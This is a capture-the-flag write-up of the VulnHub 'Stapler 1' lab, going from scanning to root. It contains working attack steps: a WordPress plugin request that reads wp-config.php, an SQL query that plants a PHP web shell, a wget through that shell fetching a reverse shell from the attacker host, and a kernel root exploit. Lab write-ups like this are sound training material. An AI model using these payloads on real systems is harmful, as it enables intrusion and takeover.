# Machine Details

### Machine Link:
https://www.vulnhub.com/entry/stapler-1,150/
#### OS
Linux (ubuntu)
#### Web-Technology

#### IP
192.168.1.151
#### Users
Barry
John
Kathy

----
# Nmap

```bash
nmap -v -sV -p- 192.168.1.151 --open

PORT STATE SERVICE VERSION

21/tcp open ftp vsftpd 2.0.8 or later
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp open domain dnsmasq 2.75
80/tcp open http PHP cli server 5.5 or later
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp open pkzip-file .ZIP file
3306/tcp open mysql MySQL 5.7.12-0ubuntu1
12380/tcp open http Apache httpd 2.4.18 ((Ubuntu))
```

---
# Web Service Enumeration

### NIKTO

```bash
nikto -host http://192.168.1.151/ -C all

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.151
+ Target Hostname:    192.168.1.151
+ Target Port:        80
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /.bashrc: User home dir was found with a shell rc file. This may reveal file and path information.
+ /.profile: User home dir with a shell profile was found. May reveal directory information and system configuration.
---------------------------------------------------------------------------
```

Scanning on port 12380 :
```bash
nikto -host http://192.168.1.151:12380 -C all        
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.151
+ Target Hostname:    192.168.1.151
+ Target Port:        12380
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'dave' found, with contents: Soemthing doesn't look right here.
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /c/: This might be interesting.
+ /js: This might be interesting.
+ /CSNews.cgi?command=viewnews&database=none: csNews reveals system path and other sensitive information in error messages. Also may be possible to bypass authentication mechanism.
+ /wcadmin/login.aspx: QS/1 Webconnect administration panel.
```

---
# FTP

We found anonymous FTP login on the target :

**ftp 192.168.1.151**
**anonymous**
a@a.com

<img width="1460" height="475" alt="image" src="https://github.com/user-attachments/assets/db696379-fae6-4b44-b307-879c6c37919b" />


We found a file named note inside the ftp
<img width="1880" height="369" alt="image" src="https://github.com/user-attachments/assets/7d5ceb4a-55ea-4229-8b63-1fad6c77aa34" />

Opening the note file

```
cat note     
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

<img width="1627" height="118" alt="image" src="https://github.com/user-attachments/assets/a0a343cf-31c1-4a86-a105-a42a7d130e60" />

---
# Samba

Enumerating samaba shares with smclient 

```bash
smbclient -L ///192.168.1.151
```

<img width="941" height="476" alt="image" src="https://github.com/user-attachments/assets/628ea83d-5275-4004-8438-524d55d0eec6" />

Here we got no password on kathy share :
<img width="929" height="334" alt="image" src="https://github.com/user-attachments/assets/293c8239-da0b-4f95-af14-d6761c1f866f" />

Enumerating Kathy share :

We got todo-list.txt in kathy_stuff 
```
cat todo-list.txt 
I'm making sure to backup anything important for Initech, Kathy
```

And in backup directory we found vsftpd.conf file and a fresh wordpress installation.

---

Visiting the port 12380 :
<img width="1919" height="1044" alt="image" src="https://github.com/user-attachments/assets/b3d3e669-beaf-4bf5-914e-39e0b9350f73" />

Now when we used https on this IP :

https://192.168.1.151:12380/
<img width="975" height="541" alt="image" src="https://github.com/user-attachments/assets/2da15948-890b-40ad-8857-c768b9ea846c" />

Now lets do a file bruteforcing on this target :

```bash
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt --hc 400-500 https://192.168.1.151:12380/FUZZ

=====================================================================
ID           Response   Lines    Word       Chars       Payload   
=====================================================================
000000069:   200        1 L      3 W        21 Ch       "index.html"
000000248:   200        3 L      6 W        59 Ch       "robots.txt"
000000379:   200        1 L      3 W        21 Ch       "."                  
```

We found the robots.txt file :
<img width="840" height="456" alt="image" src="https://github.com/user-attachments/assets/e10e363e-16f0-4c26-af45-efbbea062c63" />

We found two entries admin112233 and blogblog. On admin112233 we found just a popup and redirection to another website. On the other hand on blogblog this website is running which looks like wordpress.
<img width="1919" height="1043" alt="image" src="https://github.com/user-attachments/assets/47c1b077-50b8-4058-8d63-deb2ee49945b" />

In the page source we found the wordpress version :
<img width="1919" height="1049" alt="image" src="https://github.com/user-attachments/assets/27f5539d-702d-4b99-92f5-6e90b0c382cc" />


Lets use wpscan tool to enumerat further :
```bash
wpscan --url https://192.168.1.239:12380/blogblog --disable-tls-checks --enumerate ap,at,cb,dbe --plugins-detection aggressive --plugins-version-detection aggressive
```

<img width="1388" height="312" alt="image" src="https://github.com/user-attachments/assets/552af758-9b0f-42ae-80bb-34132a7d2a13" />

Lets search for exploit for this plugin on google :
https://www.exploit-db.com/exploits/39646

Upon inspecting we found that through using the admin-ajax.php we can create a post on the application where we can insert file data into the thumbnail of the post :

```python
objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php')
```

So we used the endpoint with our URL and a random value to create a post :

https://192.168.1.151:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=%27%20+%20651468465314%20+%20%27&short=rnd&term=rnd&thumb=../wp-config.php

<img width="1483" height="572" alt="image" src="https://github.com/user-attachments/assets/da2cfa0b-fa1f-44bd-bd0f-c5d904aacd5f" />


Now go to the home page and you will see the post, inspect the code and you will find the image source of the thumbnail :

<img width="1919" height="1045" alt="image" src="https://github.com/user-attachments/assets/a29f45e2-9e98-42b2-a257-a7b9adaf204f" />


Use wget to download the image :
```bash
wget https://192.168.1.151:12380/blogblog/wp-content/uploads/268772653.jpeg --no-check-certificate
```

After downloading cat the image to see its content :

<img width="1381" height="856" alt="image" src="https://github.com/user-attachments/assets/94a30c07-52ab-43fa-aa82-8c1aafb07a33" />

We have the credentials of root:plbkac. Login with these credentials on phpmyadmin :
https://192.168.1.151:12380/phpmyadmin

<img width="1919" height="1049" alt="image" src="https://github.com/user-attachments/assets/d03a01c7-e6c9-4204-88a8-738a540ff349" />


Here we will use sql query to create a phpcmd file. For this go to SQL and 

```sql
select "<?php passthru($_GET['cmd']); ?>" into outfile "/var/www/https/blogblog/wp-content/uploads/phpcmd.php"
```

<img width="1920" height="1045" alt="image" src="https://github.com/user-attachments/assets/8ce888fe-6712-4b8b-9ab2-bfce74b9fa36" />


Now hit the php file we created at :
https://192.168.1.151:12380/blogblog/wp-content/uploads/phpcmd.php?cmd=id

<img width="1398" height="750" alt="image" src="https://github.com/user-attachments/assets/f569f8a3-b99e-433f-b53e-62c0c6e7d067" />


Now we have RCE, we just need to take the php-reverse-shell.php file to the target. For that first copy the php-reverse-shell.php file to your current location, edit the IP and port to your IP and port. Finally start the python portable server :
```bash
python -m http.server

#you can use --bind switch to bind to your ip
python -m http.server --bind 192.168.1.9
```

Now go to your servers link and copy the link for php-reverser-shell.php file :

<img width="1245" height="868" alt="image" src="https://github.com/user-attachments/assets/4c462de8-3a8f-4b64-b929-0732dcfeb3a6" />


Now download this file using wget -O switch to uploads directory via the found RCE :
```
https://192.168.1.151:12380/blogblog/wp-content/uploads/phpcmd.php?cmd=wget%20http://192.168.1.9/php-reverse-shell.php%20-O%20/var/www/https/blogblog/wp-content/uploads/php-reverse-shell.php
```


Start the listner on desiganted port and finally on the RCE endpoint just call the file :
```
https://192.168.1.151:12380/blogblog/wp-content/uploads/php-reverse-shell.php
```

We got the shell !

<img width="1284" height="664" alt="image" src="https://github.com/user-attachments/assets/23d7f473-18d7-41d1-be5a-d3a69f783394" />

---
# Privielge Escalation

For privilege escalation we will use linux exploit suggester, les.sh script. Download or take the script to the target machine.

```
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

chmod +x les.sh

# run the script
./les.sh
```

Here i will use this double-fdput() exploit.

<img width="1908" height="915" alt="image" src="https://github.com/user-attachments/assets/7cc9d47f-072f-41b9-a4cf-8079c30f74df" />

```bash
# download the exploit
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip

# unzip the expliot file
unzip 39772.zip

#go to the unziped directory
cd 39772

# again extract content from exploit.tar directory
tar xf exploit.tar

# go to this directory
cd ebpf_mapfd_doubleput_exploit

# run the compilation script
./compile.sh

# run this script
./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, youll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...

root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit# whoami
root
root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
root@red:/root# cat flag.txt 
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```

<img width="1071" height="894" alt="image" src="https://github.com/user-attachments/assets/6d88c3ae-e8ac-4d75-b852-0794e2f0435b" />

---
